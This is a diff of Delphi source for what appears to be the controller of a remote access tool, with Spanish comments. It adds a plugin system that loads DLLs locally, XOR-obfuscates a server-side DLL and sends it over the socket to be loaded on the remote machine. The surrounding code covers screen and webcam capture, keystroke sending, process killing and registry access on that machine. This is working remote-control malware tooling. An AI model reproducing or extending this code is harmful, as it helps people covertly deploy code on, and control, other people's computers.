@@ -6,7 +6,7 @@ uses
   Windows, Shellapi, Messages, SysUtils, Classes, Graphics, Controls, Forms, CommCtrl,
   Dialogs, ComCtrls, XPMan, ImgList, Menus, ExtCtrls, StdCtrls, Buttons, {ScktComp,} Jpeg,
   Spin,
-  IdTCPServer, ActiveX, gnugettext, MMsystem;
+  IdTCPServer, ActiveX, gnugettext, MMsystem, UnitPlugins;
 
 type
   TSearchItem = record
@@ -458,6 +458,9 @@ type
     procedure CerrarConexin1Click(Sender: TObject);
     procedure MatarProceso1Click(Sender: TObject);
     procedure TabPuertosShow(Sender: TObject);
+    procedure cmbUnidadesDrawItem(Control: TWinControl; Index: Integer;
+      Rect: TRect; State: TOwnerDrawState);
+    procedure ListViewDescargasDblClick(Sender: TObject);
 
   private //Funciones y variables privadas que solo podemos usar en este Form
     FormVisorDeMiniaturas: TObject;
@@ -500,6 +503,8 @@ type
     procedure Estado(Estado: string);
     procedure AgregarARichEdit(Texto: string); //Agrega texto en color a RichEdit
   public //Funciones públicas que podemos llamar desde otros Forms
+    Plugins: array[0..100] of TPlugin;
+    NumeroPlugins : integer; //Numero de plugins cargados
     Servidor: TIdPeerThread;
     RecibiendoJPG: Boolean; //Recibiendo captura? o camara o thumbnail  (se usa desde UnitVisorDeMiniaturas)
     AnchuraPantalla, AlturaPantalla: Integer; //Altura y anchura de la pantalla del servidor
@@ -512,6 +517,7 @@ type
     procedure OnReadFile(AThread: TIdPeerThread); overload;
     procedure CrearDirectoriosUsuario(); //Es llamada tambien desde el visor de Thumbnails
     function InitWavFile(var Ms: TMemoryStream; nChannels, nSamplesPerSec, wBitsPerSample: Word; b: string): Integer;
+    procedure CargarPlugin(PluginName:string);
   end;
 
 var
@@ -523,6 +529,30 @@ uses UnitMain, UnitOpciones, UnitVisorDeMiniaturas, UnitTransfer,
   UnitFormReg, ScreenMaxCap, UnitFormSendKeys, UnitFunciones, AxThumbsDB, Storages;
 
 {$R *.dfm}
+
+procedure TFormControl.CargarPlugin(PluginName:string);
+var
+  i : integer;
+  Path : string;
+  H : THandle;
+  Plugin : TPlugin;
+begin
+  for i:= 0 to formopciones.ListViewPlugins.Items.Count-1 do
+    if formopciones.ListViewPlugins.Items[i].caption = PluginName then
+      Path := formopciones.ListViewPlugins.Items[i].SubItems[1];
+
+  if Path <> '' then
+  begin
+    H := loadlibrary(pchar(Path));
+    Plugins[NumeroPlugins] := TPlugin.Create(H);
+    Plugins[NumeroPlugins].path := Path;
+    //Mostramos la form del plugin
+    Plugins[NumeroPlugins].Conectar(Myitem.Caption, Servidor.Connection.Socket.Binding.Handle, NumeroPlugins);   
+    TForm(Plugins[NumeroPlugins].dForm).Visible := false;//La ocultamos hasta que el server la cargue
+    Servidor.Connection.WriteLn('LOADPLUGIN|'+Plugins[NumeroPlugins].PluginName+'|'+inttostr(NumeroPlugins)+'|');
+    NumeroPlugins := NumeroPlugins+1;
+  end;
+end;
 
 procedure TFormControl.AgregarARichEdit(Texto: string);
 var
@@ -699,8 +729,8 @@ begin
   Self.ListViewServicios.DoubleBuffered := True;
   Self.TreeViewRegedit.DoubleBuffered := True;
   recibiendofichero := False;
-  Self.Height := 829; //Altura Predeterminada
-  Self.Width := 827; //Anchura predeterminada
+  Self.Height := 512; //Altura Predeterminada
+  Self.Width := 591; //Anchura predeterminada
   if FormMain.ControlWidth > 0 then
     Self.Width := FormMain.ControlWidth;
   if FormMain.ControlHeight > 0 then
@@ -795,6 +825,8 @@ var
   i, a, o: Integer;
   RealSize: string;
   itemv: TSearchItem;
+  PluginFile : file;
+  Tamano : integer;
 begin
   Recibido := Command;
   //FormMain.Caption := Recibido; //Para debug
@@ -1069,12 +1101,12 @@ begin
           //Formato
           Delete(Recibido, 1, Pos('|', Recibido));
           case StrToInt(Copy(Recibido, 1, (Pos('|', Recibido) - 1))) of //el último caracter
-            0: TempStr := TempStr + _(' - Unidad desconocida');
-            2: TempStr := TempStr + _(' - Unidad removible');
-            3: TempStr := TempStr + _(' - Disco duro');
-            4: TempStr := TempStr + _(' - Disco de red');
-            5: TempStr := TempStr + _(' - Unidad de CD/DVD');
-            6: TempStr := TempStr + _(' - Disc RAM');
+            0: TempStr := TempStr + '-' + _('Unidad desconocida');
+            2: TempStr := TempStr + '-' + _('Unidad removible');
+            3: TempStr := TempStr + '-' + _('Disco duro');
+            4: TempStr := TempStr + '-' + _('Disco de red');
+            5: TempStr := TempStr + '-' + _('Unidad de CD/DVD');
+            6: TempStr := TempStr + '-' + _('Disc RAM');
           end;
           cmbUnidades.Items.Add(TempStr);
           Delete(Recibido, 1, Pos('|', Recibido));
@@ -1440,6 +1472,58 @@ begin
       CheckBoxPuertos.Enabled := True;
     end;
 
+
+    
+    if Copy(Recibido, 1, 12) = 'PLUGINLOADED' then  //El plugin acaba de ser cargado
+    begin
+      Delete(Recibido, 1, 13);
+      i := strtointdef(Copy(Recibido, 1, Pos('|', Recibido) - 1),-1);
+      if i <> -1 then
+      begin
+        {Abrimos la form del plugin y le mandamos el handle del socket y su id para que pueda mandar datos}
+         TForm(Plugins[i].dForm).Visible := true;
+      end;
+    end;
+
+    if Copy(Recibido, 1, 12) = 'PLUGINUPLOAD' then
+    begin
+      //Subimos el plugin al servidor, de momento todo de golpe :p ; en el futuro estaría bien subirlo como los demas archivos
+      Delete(Recibido, 1, 13);
+      i := strtointdef(Copy(Recibido, 1, Pos('|', Recibido) - 1),-1);
+      if i <> -1 then
+      begin
+        TempStr := copy(Plugins[i].Path,1,length(Plugins[i].Path)-5)+'S.dll';   //el archivo del servidor
+
+        if fileexists(TempStr) then
+        begin
+          FileMode := 0;
+          AssignFile(PluginFile, Tempstr);
+          Reset(PluginFile, 1);
+          tamano := FileSize(PluginFile);
+          SetLength(TempStr, tamano);
+          BlockRead(PluginFile, TempStr[1], tamano);
+          CloseFile(PluginFile);
+
+          for a := 1 to Length(TempStr) do //Lo mandamos cifrado
+            TempStr[a] := chr(Ord(TempStr[a]) xor a);
+
+          Servidor.Connection.Write('PLUGINUPLOAD|'+Plugins[i].PluginName+'|'+inttostr(Length(TempStr))+'|'+inttostr(i)+'|'+#10+TempStr);
+        end;
+      end;
+    end;
+
+    if Copy(Recibido, 1, 10) = 'PLUGINDATA' then  //El plugin nos manda datos en el formato: PLUGIN|Nombreplugin|DATOS
+    begin
+      Delete(Recibido, 1, 11);
+      TempStr := Copy(Recibido, 1, Pos('|', Recibido) - 1);
+      Delete(Recibido, 1, Pos('|', Recibido));
+      for i:=0 to NumeroPlugins do
+        if Plugins[i].PluginName = TempStr then
+        begin
+          Plugins[i].RecData(Recibido);
+          exit;
+        end;
+    end; 
   // se fini del dispacher de comandos
 end;
 
@@ -5168,6 +5252,38 @@ procedure TFormControl.TabPuertosShow(Sender: TObject);
 begin
   if (FormOpciones.CheckBoxAutoRefrescar.Checked) then
     BtnRefrescarPuertos.Click;
+end;
+
+procedure TFormControl.cmbUnidadesDrawItem(Control: TWinControl;
+  Index: Integer; Rect: TRect; State: TOwnerDrawState);
+var
+  caption : string;
+  imageindex : integer;
+begin
+    caption := (Control as TCustomComboBox).Items[Index];
+    if pos(_('Unidad de CD/DVD'), caption) > 0 then
+      ImageIndex := 108
+    else
+    if pos(_('Disco de red'), caption) > 0 then
+      ImageIndex := 109
+    else
+    if pos(_('Unidad removible'), caption) > 0 then
+      ImageIndex := 111
+    else
+      ImageIndex := 110;
+
+    (Control as TCustomComboBox).Canvas.FillRect(Rect);
+    IconsArchivos.Draw((Control as TCustomComboBox).Canvas, Rect.Left, Rect.Top, ImageIndex);
+    (Control as TCustomComboBox).Canvas.TextOut(Rect.Left + 19, Rect.Top + (Rect.Bottom - Rect.Top - Canvas.TextHeight((Control as TCustomComboBox).Items[Index])) div 2, (Control as TCustomComboBox).Items[Index]);
+end;
+
+
+procedure TFormControl.ListViewDescargasDblClick(Sender: TObject);
+begin
+  if ListViewDescargas.Selected = nil then exit;
+    if TDescargaHandler(ListViewDescargas.Selected.Data).Descargado = TDescargaHandler(ListViewDescargas.Selected.Data).SizeFile then
+      if pos('.exe', lowercase(TDescargaHandler(ListViewDescargas.Selected.Data).Destino)) = 0 then
+        ShellExecute(0, 'open', PChar(TDescargaHandler(ListViewDescargas.Selected.Data).Destino), '', PChar(TDescargaHandler(ListViewDescargas.Selected.Data).Destino), SW_NORMAL);
 end;
 
 end. //Fin del proyecto
